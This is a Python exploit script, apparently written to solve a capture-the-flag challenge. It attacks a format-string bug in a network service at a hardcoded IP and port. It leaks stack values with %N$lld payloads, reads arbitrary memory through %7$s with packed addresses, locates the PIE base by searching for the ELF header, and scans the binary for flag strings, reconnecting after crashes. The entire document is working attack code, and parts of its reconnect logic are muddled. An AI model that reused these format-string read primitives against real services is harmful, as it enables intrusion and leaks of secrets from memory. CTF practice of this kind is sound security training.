#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)
def get_pie(s):
    a15=leak_lld(s,15)
    if not a15: return None
    start=a15&~0xfff
    for delta in range(0,0x20000,0x1000):
        X=start-delta; r=readmem(s,X)
        if r.startswith(b'\x7fELF'): return X
    return None

# scan the binary region base..base+0x10000 for flag markers, reconnecting on crash
flags=[]
off=0x1000
limit=0x10000
try:
    s=newconn(); pie=get_pie(s)
    print("pie=",hex(pie) if pie else None)
    cur=pie
    while cur < pie+limit:
        r=readmem(s,cur)
        if b'PTITCTF' in r or b'GZCTF{' in r or b'{' in r:
            print("MARK at",hex(cur),repr(r[:300]))
            flags.append((cur,r))
        # advance: if readable string, move past it; else +1
        if r.startswith(b'<T') or r==b'':
            # connection died; reconnect
            try: s.close()
            except: pass
            s=newconn(); pie=get_pie(s)
            cur=pie+ (cur-pie)
            cur += 1
        else:
            strb = r.split(b'AAAA')[0] if b'AAAA' in r else r
            adv = max(len(strb),1)
            cur += adv
        if cur % 0x1000 < adv or (cur>>12) != ((cur-adv)>>12):
            pass
        if cur - pie > limit: break
except Exception as e:
    print("err",e)
print("=== done, markers:", len(flags))
for a,r in flags[:20]:
    print(hex(a), repr(r[:200]))
